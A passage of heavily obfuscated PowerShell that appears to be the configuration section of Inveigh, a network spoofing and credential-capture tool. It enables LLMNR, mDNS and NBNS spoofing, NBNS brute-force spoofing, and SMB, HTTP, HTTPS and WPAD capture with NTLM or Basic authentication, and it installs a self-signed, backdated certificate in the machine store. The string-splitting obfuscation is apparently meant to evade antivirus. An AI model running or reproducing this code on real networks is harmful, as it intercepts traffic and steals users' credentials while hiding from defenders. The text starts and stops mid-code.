}
else
{
    ${i`Nve`igH}."sTA`TuS_QU`eue".("{0}{1}"-f 'Ad','d').Invoke(("{3}{2}{1}{0}{5}{4}" -f ' Mo',' Privilege','vated','Ele','isabled','de = D'))  > ${N`ULL}
}

if(${fI`REWAl`L_st`ATUS})
{
    ${inv`EI`GH}."StAtu`S_q`UeUe".("{0}{1}" -f'A','dd').Invoke(("{0}{5}{4}{6}{3}{2}{1}" -f 'Wind','d','ble','a','w','o','s Firewall = En'))  > ${nU`lL}
    ${fiRewALL`_R`UlEs} = &("{3}{1}{0}{2}" -f 'jec','Ob','t','New-') -comObject ("{5}{3}{0}{4}{1}{2}"-f 'o','ic','y2','g.FwP','l','HNetCf')
    ${F`irEW`ALl_`p`owerSheLl} = ${f`i`REWA`ll_RULEs}."R`ULes" | &("{1}{3}{2}{0}" -f'Object','Wh','e-','er') {${_}."EnAbL`ed" -eq ${t`Rue} -and ${_}."direcTI`oN" -eq 1} |&("{4}{3}{1}{0}{2}"-f 'e','j','ct','Ob','Select-') -Property ("{0}{1}" -f 'Na','me') | &("{1}{0}{2}{3}"-f 'e','Sel','ct-St','ring') "Windows PowerShell}"

    if(${fIreWAlL`_P`OWe`RS`HeLl})
    {
        ${iNV`EI`Gh}."sTatuS_`qu`e`Ue".("{0}{1}"-f 'A','dd').Invoke(("{3}{1}{4}{7}{6}{8}{2}{5}{0}" -f' Allowed','o','.ex','Wind','ws Firewa','e =','l ','l','- PowerShell'))  > ${n`ULL}
    }

}

${IN`Vei`gH}."STAtU`S_QUe`UE".("{0}{1}" -f'Ad','d').Invoke(('Pr'+'imary'+' '+'IP'+' '+'A'+'ddre'+'ss '+'= '+"$IP"))  > ${NU`lL}

if(${l`l`MnR} -eq 'Y' -or ${M`dNS} -eq 'Y' -or ${N`BnS} -eq 'Y')
{
    ${INvE`IgH}."st`A`TUs_QuE`Ue".("{1}{0}"-f'd','Ad').Invoke(('LLMNR/'+'mDNS/N'+'B'+'NS '+'Spo'+'ofer'+' '+'IP'+' '+'Addr'+'ess'+' '+'= '+"$SpooferIP"))  > ${nU`lL}
}

if(${ll`mnR} -eq 'Y')
{

    if(${eLEvA`TE`D`_PriVIlE`GE} -or !${llMnr_P`o`RT`_CheCK})
    {
        ${i`Nv`EIGh}."St`AtuS_qu`e`UE".("{0}{1}"-f'Ad','d').Invoke(("{1}{5}{3}{2}{0}{4}{6}" -f '= E','LL','er ',' Spoof','nab','MNR','led'))  > ${NU`lL}
        ${inVe`i`Gh}."St`ATuS_q`UeUe".("{0}{1}" -f 'Ad','d').Invoke(('LLMN'+'R'+' '+'TTL'+' '+'= '+"$LLMNRTTL "+'Sec'+'onds'))  > ${nU`Ll}
        ${lLMn`R_rESp`On`s`E_meSSage} = ("{3}{2}{1}{0}"-f' sent','se','on','- resp')
    }
    else
    {
        ${L`L`MNR} = "N"
        ${INV`eI`GH}."StA`T`US_QUEue".("{1}{0}"-f 'd','Ad').Invoke(("{8}{9}{0}{1}{6}{5}{2}{3}{7}{4}"-f'oofer D','is','s','e',' 5355','Due To In U','abled ',' Port','LLMNR S','p'))  > ${n`Ull}
    }

}
else
{
    ${I`Nv`EIgh}."status_qU`E`Ue".("{1}{0}" -f 'dd','A').Invoke(("{3}{1}{0}{2}{4}"-f 'r ','NR Spoofe','= Disable','LLM','d'))  > ${Nu`ll}
    ${llM`N`R`_resPOnSe_me`Ssa`ge} = ("{5}{3}{4}{1}{2}{0}" -f'abled',' is d','is','LLMNR ','spoofer','- ')
}

if(${mD`NS} -eq 'Y')
{

    if(${El`Ev`AteD_pRiViL`eGE} -or !${mD`Ns_Po`RT_C`HECK})
    {
        ${MdNS`TYp`es_`OuTPUt} = ${mD`Nst`yp`Es} -join ","

        if(${Mdn`S`T`YPES}."cOu`NT" -eq 1)
        {
            ${INV`Ei`gh}."s`Tatus_qu`eUE".("{1}{0}" -f 'd','Ad').Invoke(('mD'+'NS '+'S'+'p'+'oofer '+'F'+'or '+'Type'+' '+"$mDNSTypes_output "+'= '+'E'+'nab'+'led'))  > ${NU`ll}
        }
        else
        {
            ${INvEi`gH}."STAtU`s`_QueUe".("{1}{0}" -f 'dd','A').Invoke(('mDNS'+' '+'S'+'poo'+'fer '+'F'+'or '+'Typ'+'es'+' '+"$mDNSTypes_output "+'= '+'E'+'nabled'))  > ${nU`LL}
        }

        ${InvEi`GH}."s`TaT`US`_quEUE".("{1}{0}" -f'd','Ad').Invoke(('m'+'DNS '+'T'+'TL '+'= '+"$mDNSTTL "+'Sec'+'onds'))  > ${n`Ull}
        ${Md`N`s_Resp`on`SE_m`es`sage} = ("{1}{2}{0}"-f'ent','- r','esponse s')

    }
    else
    {
        ${mD`Ns} = "N"
        ${iNVE`Igh}."S`T`ATUS_`QuEuE".("{1}{0}" -f 'dd','A').Invoke(("{11}{4}{7}{12}{0}{3}{5}{8}{1}{6}{10}{2}{9}" -f' ',' ',' Po','Due To ','NS Spoofer Disab','I','U','l','n','rt 5353','se','mD','ed'))  > ${nU`Ll}
    }

}
else
{
    ${I`N`VEIgh}."St`ATuS_QU`EuE".("{1}{0}"-f 'd','Ad').Invoke(("{3}{1}{4}{2}{0}{5}" -f 'ab',' ','Dis','mDNS','Spoofer = ','led'))  > ${nU`LL}
    ${MDN`S`_res`P`onSE`_Mess`AGE} = ("{1}{0}{8}{7}{2}{6}{5}{4}{3}"-f 'DNS s','- m','is ','led','ab','is','d','oofer ','p')
}

if(${n`BNs} -eq 'Y')
{
    ${nBnst`Y`PeS`_o`Ut`put} = ${nBNsT`Yp`ES} -join ","
    ${NBns_`R`EsPONSE_M`essage} = ("{1}{3}{2}{0}"-f' sent','-','se',' respon')
    
    if(${N`B`Ns`TypeS}."cO`Unt" -eq 1)
    {
        ${i`Nv`eiGH}."ST`ATuS_Q`UeUe".("{0}{1}" -f'A','dd').Invoke(('N'+'BNS '+'Sp'+'o'+'ofer '+'Fo'+'r '+'T'+'ype '+"$NBNSTypes_output "+'= '+'Ena'+'bl'+'ed'))  > ${N`Ull}
    }
    else
    {
        ${INvE`IGH}."stAtUS`_Que`UE".("{0}{1}" -f 'A','dd').Invoke(('NBN'+'S '+'Sp'+'oofer'+' '+'For'+' '+'T'+'ypes '+"$NBNSTypes_output "+'= '+'Enabl'+'ed'))  > ${N`Ull}
    }

}
else
{
    ${Inv`eigh}."St`A`T`Us_quEUe".("{1}{0}"-f 'dd','A').Invoke(("{2}{5}{1}{6}{4}{3}{0}"-f'= Disabled','S','NB','fer ','Spoo','N',' '))  > ${nU`Ll}
    ${NbnS_reS`PON`Se_`M`ESSAge} = ("{2}{4}{3}{1}{5}{0}{6}{7}" -f'fer','sp','-',' ',' NBNS','oo',' is disable','d')
}

if(${n`BnSBR`U`Teforce} -eq 'Y')
{   
    ${in`VE`IGH}."sT`ATus_Qu`e`Ue".("{1}{0}"-f'dd','A').Invoke(('N'+'BNS '+'Brut'+'e'+' '+'Force'+' '+'Spoofer'+' '+'Tar'+'ge'+'t '+'= '+"$NBNSBruteForceTarget")) > ${nU`Ll}
    ${i`NVE`Igh}."Stat`Us_Q`UeUE".("{1}{0}"-f'dd','A').Invoke(('NB'+'NS '+'Brut'+'e '+'F'+'o'+'rce '+'Spoofe'+'r'+' '+'IP'+' '+'Ad'+'dre'+'ss '+'= '+"$SpooferIP")) > ${n`ULL}
    ${I`NvE`Igh}."sTatu`s`_QueUe".("{1}{0}"-f'dd','A').Invoke(('N'+'BNS '+'Br'+'ute '+'Fo'+'rce '+'Spo'+'ofer '+'Ho'+'stname '+'= '+"$NBNSBruteForceHost")) > ${N`ULl}

    if(${N`BNSbrU`TeF`orCePaUSE})
    {
        ${iNv`E`Igh}."St`AtuS_Q`U`euE".("{0}{1}"-f'Ad','d').Invoke(('NBNS'+' '+'Bru'+'t'+'e '+'F'+'o'+'rce '+'P'+'au'+'se '+'= '+"$NBNSBruteForcePause "+'Secon'+'d'+'s')) > ${n`UlL}
    }

}

if(${NB`Ns} -eq 'Y' -or ${NBnSb`Rute`F`OrCe} -eq 'Y')
{
    ${i`NveIgH}."sT`ATUS_quE`Ue".("{1}{0}"-f 'd','Ad').Invoke(('NBN'+'S '+'TTL'+' '+'= '+"$NBNSTTL "+'Se'+'cond'+'s')) > ${NU`LL}
}

if(${S`POOfERl`EAR`NiNg} -eq 'Y' -and (${L`lmnr} -eq 'Y' -or ${n`Bns} -eq 'Y'))
{
    ${INve`IGH}."sTA`TUs_QUe`Ue".("{0}{1}" -f 'Ad','d').Invoke(("{4}{1}{7}{6}{0}{2}{3}{5}"-f'g','p',' = Ena','bl','S','ed','nin','oofer Lear'))  > ${nu`lL}

    if(${sp`O`oFER`lEAr`Ni`NgdeL`AY} -eq 1)
    {
        ${in`VEI`GH}."STaT`Us`_QUEUe".("{0}{1}" -f'Ad','d').Invoke(('S'+'poofer '+'Learn'+'i'+'ng '+'Delay'+' '+'= '+"$SpooferLearningDelay "+'Min'+'ute'))  > ${n`ULL}
    }
    elseif(${spOOf`E`RLEARN`Ing`dElAY} -gt 1)
    {
        ${iNv`E`iGh}."ST`ATUS`_que`UE".("{1}{0}"-f'd','Ad').Invoke(('Sp'+'oofer'+' '+'Lear'+'ni'+'ng '+'De'+'lay '+'= '+"$SpooferLearningDelay "+'Minut'+'es'))  > ${nu`ll}
    }
    
    if(${SPoO`F`erLEaR`N`ingintErV`Al} -eq 1)
    {
        ${inveI`gH}."ST`ATUS`_q`Ueue".("{0}{1}"-f 'A','dd').Invoke(('S'+'poofe'+'r '+'L'+'e'+'arning '+'I'+'n'+'terval '+'= '+"$SpooferLearningInterval "+'Mi'+'nute'))  > ${N`UlL}
    }
    elseif(${SPOoFErLe`ArNIn`gINT`e`RV`AL} -eq 0)
    {
        ${iNV`e`igh}."STA`TUs_que`Ue".("{1}{0}" -f 'dd','A').Invoke(("{4}{1}{2}{0}{5}{6}{3}" -f ' Lear','o','fer','erval = Disabled','Spo','ning ','Int'))  > ${nU`Ll}
    }
    elseif(${S`poOFe`R`LEa`RNInginTeRVal} -gt 1)
    {
        ${IN`V`eigH}."sT`A`Tu`S_QueUe".("{0}{1}" -f 'Ad','d').Invoke(('Spoof'+'er '+'Lear'+'ning'+' '+'I'+'nterv'+'al '+'= '+"$SpooferLearningInterval "+'Mi'+'nutes'))  > ${N`ULl}
    }

}

if(${sP`O`of`eRHostSrE`PLy} -and (${llm`Nr} -eq 'Y' -or ${N`Bns} -eq 'Y'))
{
    ${i`NVeiGH}."s`Ta`TuS_QUEue".("{0}{1}"-f 'Ad','d').Invoke(("{4}{5}{2}{3}{1}{0}"-f '= ','ply ','ofer H','osts Re','Sp','o') + (${SpO`OferhoS`T`srEp`Ly} -join ","))  > ${nU`LL}
}

if(${S`PO`ofERhOs`TS`i`gnORE} -and (${LLm`NR} -eq 'Y' -or ${n`BNS} -eq 'Y'))
{
    ${iN`Ve`igh}."sT`At`Us_`queUE".("{0}{1}"-f'Ad','d').Invoke(("{1}{5}{2}{6}{4}{3}{0}"-f ' = ','S',' Host','re','no','poofer','s Ig') + (${s`POOF`Erh`OSTsIgN`o`Re} -join ","))  > ${Nu`LL}
}

if(${sp`OO`FE`RiPS`REPlY} -and (${LL`m`Nr} -eq 'Y' -or ${Nb`Ns} -eq 'Y'))
{
    ${InVe`i`gh}."s`TAtus_q`UeuE".("{0}{1}"-f'Ad','d').Invoke(("{0}{3}{1}{4}{5}{2}"-f 'Spoo','Ps','ply = ','fer I',' ','Re') + (${SPOoFE`RIp`S`RePly} -join ","))  > ${N`UlL}
}

if(${S`p`OOFErIps`i`GnORE} -and (${l`lM`Nr} -eq 'Y' -or ${Nb`Ns} -eq 'Y'))
{
    ${in`VEI`Gh}."STATu`S_`Qu`eUe".("{1}{0}"-f 'dd','A').Invoke(("{3}{2}{0}{1}"-f'Ignor','e = ','er IPs ','Spoof') + (${spo`oFE`RI`P`sIGnO`RE} -join ","))  > ${N`UlL}
}

if(${sPoOF`erRE`PEaT} -eq 'N')
{
    ${i`NVe`Igh}."SPOoFer_`R`Ep`eAT" = ${fAL`SE}
    ${IN`VE`igh}."sT`ATUs_`QU`EUE".("{0}{1}" -f 'A','dd').Invoke(("{3}{0}{1}{4}{2}{5}"-f'er R','epe','able','Spoof','ating = Dis','d'))  > ${NU`Ll}
}
else
{
    ${I`NVE`IGH}."spOofe`R_Re`p`eAt" = ${Tr`UE}
}

if(${s`mB} -eq 'Y' -and ${E`Lev`A`Ted_p`RiV`I`LEGe})
{
    ${iNVeI`gH}."st`ATuS_Q`U`EUe".("{0}{1}" -f 'Ad','d').Invoke(("{1}{3}{4}{0}{2}"-f' Enab','SMB Cap','led','t','ure ='))  > ${N`ULL}
}
else
{
    ${INVE`i`GH}."s`TatUS`_q`UEuE".("{1}{0}" -f 'dd','A').Invoke(("{2}{0}{1}{3}{4}"-f'apt','ure = D','SMB C','isabl','ed'))  > ${NU`Ll}
}

if(${H`TTP} -eq 'Y')
{

    if(${h`T`TP_`porT_che`cK})
    {
        ${h`TTp} = "N"
        ${In`Veigh}."s`TAtus_QUe`UE".("{0}{1}"-f 'Ad','d').Invoke(('HTTP'+' '+'Cap'+'ture'+' '+'D'+'isabled '+'Du'+'e '+'To'+' '+'I'+'n '+'Use'+' '+'Po'+'rt '+"$HTTPPort"))  > ${N`ULL}
    }
    else
    {

        if(${HT`TPIP} -ne ("{0}{1}" -f '0.0.','0.0'))
        {
            ${i`NvEI`gH}."sTaTu`s_q`UEUe".("{1}{0}" -f 'd','Ad').Invoke(('HT'+'TP '+'I'+'P '+'= '+"$HTTPIP")) > ${n`ULl}
        }

        if(${H`TTPp`oRT} -ne 80)
        {
            ${i`NVe`IGh}."STA`TU`s_qU`EuE".("{0}{1}" -f'Ad','d').Invoke(('HTT'+'P '+'Po'+'rt '+'= '+"$HTTPPort")) > ${n`ULL}
        }

        ${inVe`IGh}."StaTuS`_`QU`EUE".("{0}{1}" -f'A','dd').Invoke(("{5}{4}{3}{0}{1}{2}" -f'= ','En','abled','Capture ',' ','HTTP'))  > ${n`ULl}
    }

}
else
{
    ${iNVE`I`gh}."STA`TU`s_quE`UE".("{1}{0}"-f 'd','Ad').Invoke(("{1}{4}{3}{0}{2}" -f 'Disabl','HTTP Ca','ed',' = ','pture'))  > ${nU`Ll}
}

if(${H`TTPS} -eq 'Y')
{

    if(${HT`T`pS`_Por`T_c`HeCK})
    {
        ${hT`TPS} = "N"
        ${In`VEi`GH}."H`TtpS" = ${FaL`Se}
        ${IN`VE`IGh}."S`TA`TUs_qUE`UE".("{1}{0}" -f 'dd','A').Invoke(('HT'+'TPS '+'Ca'+'pture '+'Dis'+'abled'+' '+'Du'+'e '+'To'+' '+'I'+'n '+'U'+'se '+'Port'+' '+"$HTTPSPort"))  > ${Nu`Ll}
    }
    else
    {

        try
        { 
            ${I`NV`Eigh}."CeRtifica`T`E_`IssUEr" = ${HT`TP`S`CerTIsSUeR}
            ${I`N`VEIgh}."CertiFiCA`T`E`_Cn" = ${httP`SC`e`Rt`SuBJECT}
            ${I`NVE`iGH}."S`TaTus`_qu`EUE".("{0}{1}"-f 'A','dd').Invoke(("{1}{4}{2}{5}{3}{0}" -f ' Issuer = ','HTT','C','ificate','PS ','ert') + ${INve`I`gh}."Ce`RtIfi`caT`e_`Iss`UEr")  > ${NU`Ll}
            ${Inve`IGH}."stA`T`U`s_queUe".("{0}{1}" -f'Ad','d').Invoke(("{1}{3}{4}{2}{0}"-f ' ','HTTPS',' CN =',' Certifi','cate') + ${IN`VeI`gh}."C`ertiFICat`e`_cN")  > ${n`Ull}
            ${CeR`TiF`I`cATE_`cheCk} = (&("{1}{0}{2}" -f 't','Ge','-ChildItem') (("{3}{5}{4}{1}{2}{0}" -f'My','alMachi','ner6N','Cert','c',':r6NLo')).("{2}{0}{1}"-f 'Pl','Ace','Re').Invoke('r6N','\') | &("{3}{0}{2}{1}"-f 're-','ct','Obje','Whe') {${_}."IsS`UeR" -Like "CN=" + ${IN`VEi`GH}."C`eR`TiF`IC`ATe_ISsUer"})

            if(!${c`eR`TIF`i`CatE_c`hEck})
            {
                
                ${ceRtif`icA`TE_DISTIN`g`UIS`H`Ed`_naMe} = &("{1}{2}{0}" -f 'ect','new-o','bj') -com ("{9}{0}{1}{7}{4}{8}{3}{2}{6}{5}"-f'09Enrollment.','C','uished','isting','5','ame','N','X','00D','X5')
                ${ce`RtiF`ICaT`e_`dIs`T`in`gUiShE`D_`NAME}.("{0}{1}" -f'Enco','de').Invoke( "CN=" + ${i`Nv`EiGh}."cER`T`iFIc`Ate_`CN", ${CERTIfIcaTE_d`IS`TI`NGuIShe`D`_`NamE}."X500n`AME`FLAgS"."X`500naM`efLagS"."Xcn_ce`Rt_NaME`_`str_nO`Ne")
                ${c`ert`IfiCAT`E`_`IsSU`er_`DisTI`NguiSH`ed`_n`AMe} = &("{2}{1}{0}" -f 'ect','-obj','new') -com ("{5}{1}{7}{8}{3}{2}{0}{4}{6}{10}{9}" -f 'Di','50','t.CX500','lmen','st','X','in','9Enro','l','e','guishedNam')
                ${cERti`FIcatE`_isSu`eR`_`DistI`N`G`UishED_`NAmE}.("{1}{0}"-f'e','Encod').Invoke("CN=" + ${i`NVEI`Gh}."cerTiFiCaT`e_`i`s`s`UeR", ${cErTi`FiCaTE_D`i`S`TIn`g`UIShed_n`A`Me}."X500`Namef`laGs"."x500NA`mefL`AGS"."X`cn_CERt_n`AM`e_Str`_nOne")
                ${C`eRT`ifI`C`Ate_key} = &("{0}{2}{1}"-f 'ne','bject','w-o') -com ("{3}{5}{4}{1}{0}{2}{6}"-f'nt.CX509P','e','riva','X50','llm','9Enro','teKey')
                ${ce`RTIficat`E_`key}."p`R`oVideRnAmE" = ("{0}{2}{9}{10}{7}{6}{1}{4}{8}{5}{3}" -f 'Micros','r','oft','der','ypt','phic Provi',' C','AES','ogra',' Enhanced R','SA and ')
                ${ce`R`TifiCate_`K`ey}."k`EYs`pec" = 2
                ${cErt`If`IcA`Te_k`Ey}."LE`NGTH" = 2048
			    ${cErTI`F`i`Cat`e_k`EY}."m`AChI`NE`contexT" = 1
                ${CeR`TifIC`Ate_`k`eY}.("{1}{0}" -f'e','Creat').Invoke()
                ${cErtiFICate_serVe`R`_`AuT`H_oiD} = &("{1}{2}{0}"-f't','new','-objec') -com ("{1}{3}{0}{2}{4}" -f 'Obj','X509Enro','ect','llment.C','Id')
			    ${c`eRtIFiCATE_SEr`VeR_A`UtH`_`oiD}.("{2}{4}{0}{3}{1}" -f 'lizeFromVa','ue','I','l','nitia').Invoke(("{2}{3}{4}{0}{1}" -f '.3.','1','1.3.','6.1.','5.5.7'))
			    ${cE`RtIfIC`ATe_EnH`An`CEd_kEy_usA`ge`_O`ID} = &("{1}{0}{2}" -f'j','new-ob','ect') -com ("{0}{4}{7}{2}{6}{5}{1}{3}" -f 'X509E','s.','O','1','n','Id','bject','rollment.C')
			    ${cERti`F`i`CaTe_E`NhA`N`cED_KeY_`UsA`gE_OiD}.("{0}{1}" -f 'a','dd').Invoke(${CErtiFicatE_Se`RVE`R_au`T`H`_`OID})
			    ${CErT`IfICaTE_eNhaNCED`_kEy_U`S`A`ge_E`x`TensIon} = &("{1}{0}{2}"-f'-obje','new','ct') -com ("{3}{7}{5}{1}{8}{2}{0}{6}{4}"-f'e','nEn','anc','X509En','e','o','dKeyUsag','rollment.CX509Extensi','h')
			    ${CeRTIf`i`C`AT`E_EnhAnC`E`d_`keY_u`s`A`gE_exten`sI`On}.("{4}{1}{2}{0}{3}" -f 'zeEnc','i','tiali','ode','In').Invoke(${cErTiFI`catE_E`N`H`ANc`eD_Key_`UsagE_oID})
			    ${CE`Rt`iFIcAtE} = &("{2}{0}{1}"-f'-ob','ject','new') -com ("{2}{6}{0}{4}{9}{5}{3}{8}{7}{1}"-f'9En','uestCertificate','X','9Certi','roll','X50','50','eq','ficateR','ment.C')
			    ${Ce`R`TIFIc`ATE}.("{3}{0}{5}{4}{1}{2}{6}"-f 't','v','at','Ini','ri','ializeFromP','eKey').Invoke(2,${CErT`IficaTE`_`k`ey},"")
			    ${cE`Rt`iF`iCAte}."SUBJ`ECt" = ${ceRTiF`ic`Ate_`dISTI`NGUiSh`Ed_naME}
			    ${ceRTiF`i`C`Ate}."IS`SUeR" = ${CErtiF`iCA`TE_IsSUE`R_dIS`Ti`Ng`UisHeD_`Na`me}
			    ${cErTif`ICa`Te}."NO`TbEFO`RE" = (&("{2}{0}{1}"-f 'et-','date','g')).("{0}{1}{2}" -f'AddDa','y','s').Invoke(-271)
			    ${cErt`if`icA`TE}."n`ota`FTer" = ${ceRTIFIc`A`Te}."no`Tbe`FORE".("{0}{1}{2}" -f 'A','ddD','ays').Invoke(824)
			    ${C`ERTiFICaTe`_hA`SH_A`L`GoR`ithM_`OID} = &("{0}{2}{1}" -f 'Ne','-Object','w') -ComObject ("{0}{2}{1}{5}{3}{4}"-f'X509En','ol','r','.CObject','Id','lment')
			    ${CE`Rt`i`Ficate_HaSH`_aLg`oriThM_oId}.("{4}{0}{3}{2}{1}" -f'nitialize','thmName','omAlgori','Fr','I').Invoke(1,0,0,("{1}{0}"-f'256','SHA'))
			    ${c`ERTIFIcA`Te}."haSHa`lgoRI`T`hm" = ${cE`R`T`iF`I`CatE_Ha`Sh_ALGOriT`hM_Oid}
                ${c`eR`TifIc`ATe}."X`509eXt`eN`SiOns".("{0}{1}" -f 'Ad','d').Invoke(${c`eRT`iF`icATE_E`N`hanCE`d_KEY_`USa`Ge_EXtenSIoN})
                ${cEr`TIFICAte_b`ASI`c_`CO`N`strAin`TS} = &("{1}{0}{2}"-f 'w-obje','ne','ct') -com ("{0}{1}{8}{7}{5}{2}{4}{6}{3}" -f'X5','09Enrollment','ensionBasicCon','ints','st','Ext','ra','X509','.C')
			    ${c`erTi`FIcatE`_BA`sIC_`cO`NSTrAInTs}.("{0}{3}{2}{1}"-f 'Ini','izeEncode','l','tia').Invoke(("{1}{0}"-f 'ue','tr'),1)
                ${c`ErT`iF`ICAtE}."x509ExTe`NSio`Ns".("{0}{1}" -f'Ad','d').Invoke(${CErTiF`ICATe_Basi`c_c`O`NStr`AIn`TS})
                ${cERti`FI`CAtE}.("{1}{0}" -f'ncode','E').Invoke()
                ${ce`Rti`FICAtE_`eNR`O`lLMe`Nt} = &("{1}{0}{2}"-f'objec','new-','t') -com ("{3}{0}{2}{6}{5}{1}{4}"-f '09En','.CX509Enrollme','r','X5','nt','ment','oll')
			    ${CEr`Ti`FiCAtE_ENRoLL`meNT}.("{2}{1}{3}{5}{4}{0}" -f'est','nitializeF','I','ro','equ','mR').Invoke(${C`erTIF`Ic`ATE})
			    ${cER`TIfICA`TE`_dA`TA} = ${CeRT`I`FicaT`E`_enRollMeNT}.("{2}{0}{1}{3}" -f'teRe','qu','Crea','est').Invoke(0)
                ${cER`TI`F`IC`A`TE_enRO`Llment}.("{1}{2}{0}{3}"-f 'lRes','Insta','l','ponse').Invoke(2,${c`E`RtIFi`ca`Te`_Data},0,"")
                ${iN`V`eiGH}."CErt`iFIc`ATe" = (&("{2}{1}{0}" -f 'em','ildIt','Get-Ch') (("{7}{5}{1}{6}{0}{3}{2}{4}" -f 'o',':zXZ','zXZM','calMachine','y','rt','L','Ce'))."r`Ep`lACE"('zXZ',[strING][cHAR]92) | &("{0}{1}{2}{3}" -f 'W','here-Obje','c','t') {${_}."isSU`Er" -match ${i`NV`EigH}."C`erT`ifICA`TE_I`ssU`ER"})
            }
            else
            {
                
                if(${Htt`pSfo`R`C`ECERtde`lete} -eq 'Y')
                {
                    ${INV`eI`gh}."h`T`TPs_FORCe`_CeR`Ti`FICatE_dEle`TE" = ${tr`UE}
                }

                ${InV`E`IGH}."h`Ttps_`eXIsTi`NG_C`e`Rt`IFICa`TE" = ${tR`Ue}
                ${INVe`I`gh}."st`AtUS_`QueuE".("{1}{0}"-f 'd','Ad').Invoke(("{5}{3}{0}{4}{8}{1}{7}{2}{6}" -f'tu','sti','t','S Cap','re = Us','HTTP','ificate','ng Cer','ing Exi'))  > ${n`UlL}
            }
            
            ${INV`E`iGh}."H`TTPs" = ${tr`UE}

            if(${hTTP`iP} -ne ("{2}{0}{1}" -f '.0','.0.0','0'))
            { 
                ${Inv`E`Igh}."STAtus_`Qu`EUE".("{1}{0}" -f'd','Ad').Invoke(('HT'+'TPS '+'I'+'P '+'= '+"$HTTPIP")) > ${n`UlL}
            }

            if(${hT`Tp`SPorT} -ne 443)
            {   
                ${INVe`I`gh}."STaTUs`_qU`eue".("{0}{1}" -f 'A','dd').Invoke(('HTT'+'PS '+'Por'+'t '+'= '+"$HTTPSPort")) > ${nU`lL}
            }

            ${inV`ei`Gh}."stA`TuS_`QUe`Ue".("{1}{0}" -f 'd','Ad').Invoke(("{3}{1}{0}{4}{2}"-f'S Capture = En','TP','bled','HT','a'))  > ${NU`Ll}

        }
        catch
        {
            ${hTT`PS} = "N"
            ${In`V`eIGh}."H`TTPS" = ${FAL`se}
            ${I`Nve`IgH}."sTA`T`US_q`UEUe".("{0}{1}"-f 'A','dd').Invoke(("{9}{8}{4}{7}{10}{2}{5}{1}{0}{3}{6}" -f 'cate E','fi','o Cert','rr',' Capture Di','i','or','sabled','S','HTTP',' Due T'))  > ${n`Ull}
        }

    }

}
else
{
    ${in`VeiGH}."StA`T`Us_q`UEUE".("{0}{1}"-f 'A','dd').Invoke(("{0}{2}{6}{4}{1}{5}{3}"-f 'HTTP','= ','S','d','Capture ','Disable',' '))  > ${NU`ll}
}

if(${H`TTP} -eq 'Y' -or ${htt`pS} -eq 'Y')
{
    ${in`VEigh}."sTA`TUS_qu`E`UE".("{0}{1}" -f'Ad','d').Invoke(('HTT'+'P/HTTP'+'S '+'Authe'+'n'+'tication'+' '+'= '+"$HTTPAuth"))  > ${N`UlL}
    ${Inv`e`IGh}."sTa`T`Us_Qu`EuE".("{1}{0}" -f'd','Ad').Invoke(('WP'+'AD '+'A'+'uth'+'ent'+'icati'+'on '+'= '+"$WPADAuth"))  > ${N`ULL}

    if(${w`p`AdA`UTH} -like ("{0}{1}" -f 'NTLM','*'))
    {
        ${wpA`D`A`UTh`igNorE} = (${W`pa`DAuT`hIgNo`RE} | &("{3}{2}{0}{1}"-f'e','-Object','her','W') {${_} -and ${_}.("{0}{1}"-f'Tr','im').Invoke()})

        if(${wpa`DAU`THIG`NoRe}."C`oUnt" -gt 0)
        {
            ${I`N`VeIGH}."sT`AT`US`_qUeuE".("{1}{0}" -f 'dd','A').Invoke(("{10}{11}{3}{8}{4}{5}{1}{9}{2}{7}{0}{6}"-f 't','tion ','L','AD NTLM A','thenti','ca',' = ','is','u','Ignore ','W','P') + (${wpA`dAU`THIg`NO`RE} -join ","))  > ${N`ULl}
        }

    }

    if(${H`Tt`pdIr} -and !${Ht`TprESPo`N`sE})
    {
        ${InVe`i`gh}."StATUs_Q`Ue`Ue".("{1}{0}" -f'dd','A').Invoke(('H'+'T'+'TP/HTTP'+'S '+'D'+'i'+'rector'+'y '+'= '+"$HTTPDir"))  > ${N`UlL}

        if(${ht`T`PdEF`AULt`F`ILe})
        {
            ${i`Nv`eiGh}."statU`s_`Q`UEuE".("{1}{0}" -f'd','Ad').Invoke(('H'+'TTP/HTTP'+'S '+'D'+'efaul'+'t '+'Respons'+'e'+' '+'F'+'ile '+'= '+"$HTTPDefaultFile"))  > ${n`ULl}
        }

        if(${Ht`T`PdEF`AUL`TeXe})
        {
            ${I`NvEI`gH}."st`ATus_qu`eUE".("{0}{1}"-f'A','dd').Invoke(('HTTP'+'/HTTP'+'S'+' '+'Defau'+'lt '+'R'+'espo'+'ns'+'e '+'E'+'xecuta'+'ble '+'= '+"$HTTPDefaultEXE"))  > ${nu`LL}
        }

    }

    if(${Ht`TpRe`s`pOn`SE})
    {
        ${inv`eI`GH}."S`TATU`s`_QueUe".("{0}{1}"-f 'Ad','d').Invoke(("{4}{7}{6}{2}{0}{5}{8}{3}{1}" -f'e = Ena','d','S Respons','e','H','b','P/HTTP','TT','l'))  > ${n`ULl}
    }

    if(${httPR`esp`onsE} -or ${h`TTP`DiR} -and ${hT`TPcOn`TE`NTtyPE} -ne ("{2}{0}{1}" -f'x','t','html/te'))
    {
        ${In`VEIGH}."S`TaTu`s`_queUE".("{1}{0}"-f'dd','A').Invoke(('HTT'+'P'+'/HTT'+'P'+'S/Proxy '+'Cont'+'ent'+' '+'Typ'+'e '+'= '+"$HTTPContentType"))  > ${Nu`Ll}
    }

    if(${H`TTPaU`Th} -eq ("{1}{0}"-f 'ic','Bas') -or ${wpADA`U`Th} -eq ("{0}{1}" -f'Ba','sic'))
    {
        ${IN`V`eigh}."s`TA`TuS_`qUeUe".("{0}{1}"-f 'Ad','d').Invoke(('B'+'asic '+'Aut'+'hent'+'icat'+'ion '+'R'+'ealm '+'= '+"$HTTPBasicRealm"))  > ${n`ULl}
    }

    ${ht`TPrESeTd`EL`Ay} = (${http`REsE`Td`eLay} | &("{3}{2}{0}{1}"-f 'bj','ect','ere-O','Wh') {${_} -and ${_}.("{0}{1}" -f 'Tri','m').Invoke()})

    if(${HTT`PRe`sEt`DeL`Ay}."CO`Unt" -gt 0)
    {
        ${I`NVE`IgH}."St`AtuS_qU`EUe".("{0}{1}" -f'A','dd').Invoke(("{2}{1}{6}{5}{0}{3}{4}" -f ' List','P ','HTT',' ','= ','t Delay','Rese') + (${htTp`ReS`E`TDElAy} -join ","))  > ${nU`LL}
        ${Inv`Ei`Gh}."ST`ATus_qUE`Ue".("{0}{1}"-f 'Ad','d').Invoke(('HTTP'+' '+'Res'+'e'+'t '+'Del'+'ay '+'Timeo'+'ut'+' '+'= '+"$HTTPResetDelayTimeout "+'Se'+'conds')) > ${nU`Ll}
    }

    if(${p`ROxY} -eq 'Y')
    {

